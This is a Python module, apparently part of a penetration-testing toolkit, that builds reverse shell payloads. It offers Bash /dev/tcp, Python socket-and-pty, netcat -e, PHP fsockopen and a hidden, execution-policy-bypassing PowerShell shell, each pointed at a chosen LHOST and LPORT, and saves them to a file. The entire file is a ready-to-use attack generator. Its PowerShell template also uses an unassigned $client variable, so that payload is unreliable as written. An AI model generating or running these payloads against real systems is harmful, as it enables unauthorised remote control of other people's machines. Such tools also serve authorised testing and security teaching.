import os
from datetime import datetime

# ================= COLORS =================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ================= BANNER =================
BANNER = f"""
{Colors.BLUE}{Colors.BOLD}
╔════════════════════════════════════════════╗
║        REVERSE SHELL GENERATOR             ║
║      Bash • Python • NC • PHP • PS         ║
╚════════════════════════════════════════════╝
{Colors.END}
"""

# ================= PAYLOAD BUILDERS =================
def bash_shell(ip, port):
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"


def python_shell(ip, port):
    return (
        "python3 -c 'import socket,os,pty;"
        f"s=socket.socket();s.connect((\"{ip}\",{port}));"
        "os.dup2(s.fileno(),0);"
        "os.dup2(s.fileno(),1);"
        "os.dup2(s.fileno(),2);"
        "pty.spawn(\"/bin/bash\")'"
    )


def nc_shell(ip, port):
    return f"nc -e /bin/bash {ip} {port}"


def php_shell(ip, port):
    return (
        "php -r '$sock=fsockopen(\""
        f"{ip}\",{port});"
        "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    )


def powershell_shell(ip, port):
    return (
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
        f"New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});"
        "$s=$client.GetStream();[byte[]]$b=0..65535|%{{0}};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){;"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$sb=(iex $d 2>&1 | Out-String );"
        "$sb2=$sb+'PS '+(pwd).Path+'> ';"
        "$sbt=[text.encoding]::ASCII.GetBytes($sb2);"
        "$s.Write($sbt,0,$sbt.Length)}}"
    )

# ================= SAVE =================
def save_payloads(engagement, content):
    base = os.path.join(engagement["base"], "payloads")
    os.makedirs(base, exist_ok=True)

    filename = f"reverse_shells_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    path = os.path.join(base, filename)

    with open(path, "w") as f:
        f.write(content)

    return path


# ================= MENU =================
def menu():
    print(f"""
{Colors.WHITE}[1] Bash Reverse Shell{Colors.END}
{Colors.WHITE}[2] Python Reverse Shell{Colors.END}
{Colors.WHITE}[3] Netcat Reverse Shell{Colors.END}
{Colors.WHITE}[4] PHP Reverse Shell{Colors.END}
{Colors.WHITE}[5] PowerShell Reverse Shell{Colors.END}
{Colors.YELLOW}[6] Generate ALL{Colors.END}
{Colors.RED}[7] Back{Colors.END}
""")
    return input("Select payload type: ").strip()


# ================= MAIN =================
def run(engagement):
    print(BANNER)

    lhost = input(f"{Colors.YELLOW}[*] LHOST: {Colors.END}").strip()
    lport = input(f"{Colors.YELLOW}[*] LPORT: {Colors.END}").strip()

    while True:
        choice = menu()
        payloads = []

        if choice == "1":
            payloads.append(("Bash", bash_shell(lhost, lport)))

        elif choice == "2":
            payloads.append(("Python", python_shell(lhost, lport)))

        elif choice == "3":
            payloads.append(("Netcat", nc_shell(lhost, lport)))

        elif choice == "4":
            payloads.append(("PHP", php_shell(lhost, lport)))

        elif choice == "5":
            payloads.append(("PowerShell", powershell_shell(lhost, lport)))

        elif choice == "6":
            payloads = [
                ("Bash", bash_shell(lhost, lport)),
                ("Python", python_shell(lhost, lport)),
                ("Netcat", nc_shell(lhost, lport)),
                ("PHP", php_shell(lhost, lport)),
                ("PowerShell", powershell_shell(lhost, lport)),
            ]

        elif choice == "7":
            return

        else:
            print(f"{Colors.RED}[!] Invalid option{Colors.END}")
            continue

        report_lines = ["REVERSE SHELL PAYLOADS", "="*40]

        for name, payload in payloads:
            print(f"\n{Colors.GREEN}{name} Payload:{Colors.END}")
            print(payload)
            report_lines.append(f"\n{name}:\n{payload}\n")

        path = save_payloads(engagement, "\n".join(report_lines))

        print(f"\n{Colors.BLUE}[+] Saved to:{Colors.END} {path}")
